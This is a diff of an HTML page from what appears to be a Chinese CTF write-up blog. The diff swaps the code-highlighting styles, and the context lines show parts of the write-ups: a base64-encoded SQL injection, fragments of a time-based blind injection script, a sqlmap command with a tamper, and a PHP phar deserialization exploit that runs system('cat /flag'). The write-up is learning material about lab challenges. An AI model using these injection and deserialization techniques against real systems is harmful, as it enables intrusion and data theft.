@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -251,7 +259,7 @@
 <p>sql注入，不过这道题对username和password进行base64编码；抓包后万能密码得到flag    </p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/05/38a0b2749921b598.png" srcset="/img/loading.gif">        </p>
 <h2 id="Deep♂Dark♂Database"><a href="#Deep♂Dark♂Database" class="headerlink" title="Deep♂Dark♂Database"></a>Deep♂Dark♂Database</h2><p>上一道题的环境，不过还有flag，应该在数据库里；最简单的时间盲注，什么也没过滤   </p>
-<div class="hljs"><pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+<pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">import</span> base64
 <span class="hljs-keyword">import</span> datetime
 
@@ -282,14 +290,14 @@ flag=<span class="hljs-string">&#x27;&#x27;</span>
             l=mid
         mid=(s+l)&gt;&gt;<span class="hljs-number">1</span>
     flag+=<span class="hljs-built_in">chr</span>(mid)
-    print(flag)</code></pre></div></code></pre>
+    print(flag)</code></pre></code></pre>
 <p>或者直接sqlmap也可，sqlmap里有对payload进行base64编码的tamper；我还傻傻的写了个     </p>
 <p><code>sqlmap -r post.txt -tamper=base64encode --dbs</code>     </p>
 <p>得到的flag  </p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/05/4b21694a0b481003.png" srcset="/img/loading.gif">     </p>
 <p>hex解码–&gt;base64解码—&gt;<code>flag&#123;U_fffxnd_an0th3r&#125;</code>      </p>
 <h2 id="CheckIn-Web"><a href="#CheckIn-Web" class="headerlink" title="CheckIn_Web"></a>CheckIn_Web</h2><p>代码审计     </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
     highlight_file(<span class="hljs-keyword">__FILE__</span>);
     <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;secret.php&#x27;</span>);
     $iipp = $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];
@@ -320,7 +328,7 @@ flag=<span class="hljs-string">&#x27;&#x27;</span>
 
     &#125;
 
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>感觉没啥可利用的，写入也是写进<code>txt</code>文件<br>有个<code>secret.php</code>但直接访问什么也没有，不会了  </p>
 <p>在同学的提示下扫了下目录，这种代码审计题要扫目录是我没想到的，发现有git泄露     </p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/05/e702e3223ebaadad.png" srcset="/img/loading.gif">     </p>
@@ -331,7 +339,7 @@ flag=<span class="hljs-string">&#x27;&#x27;</span>
 <p><code>phar://</code>反序列化     </p>
 <p>源码中<code>elseif</code>中的<code>file_exists</code>支持phar协议；所以传入<code>filepath=phar://+文件路径</code>即可     </p>
 <p>生成phar文件      </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
     <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;
         <span class="hljs-keyword">public</span> $cmd=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;
 &#125;
@@ -345,16 +353,16 @@ $phar-&gt;setMetadata($a); <span class="hljs-comment">//触发的头是C1e4r类�
 $phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//随便写点什么生成个签名</span>
 $phar-&gt;stopBuffering();
 
-<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<span class="hljs-meta">?&gt;</span></code></pre></code></pre>
 <p>因为phar文件中有一些不可见字符，不能直接复制粘贴进行base64编码    </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
 $path=<span class="hljs-string">&#x27;exp.phar&#x27;</span>;
 $fp=fopen($path,<span class="hljs-string">&#x27;rb&#x27;</span>);<span class="hljs-comment">//以二进制打开文件</span>
 $content=fread($fp,filesize($path));  <span class="hljs-comment">//读取文件</span>
 $content=base64_encode($content);
 
-<span class="hljs-keyword">echo</span> $content;</code></pre></div></code></pre>
+<span class="hljs-keyword">echo</span> $content;</code></pre></code></pre>
 <p>上传    </p>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/05/1e37b0a8f12043a0.png" srcset="/img/loading.gif">      </p>
 <p>访问     </p>
@@ -518,6 +526,8 @@ $content=base64_encode($content);
 
 
 
+  
+    
   
 
 
